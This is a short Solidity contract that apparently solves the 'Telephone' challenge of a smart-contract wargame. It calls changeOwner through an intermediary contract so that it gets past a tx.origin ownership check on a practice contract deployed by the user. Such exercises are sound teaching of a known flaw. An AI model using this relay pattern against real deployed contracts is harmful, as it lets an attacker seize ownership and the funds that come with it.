// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone =
        Telephone(0x61c36a8d610163660E21a8b7359e1Cac0C9133e1); // your own delpoyed Telephone contract address

    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}
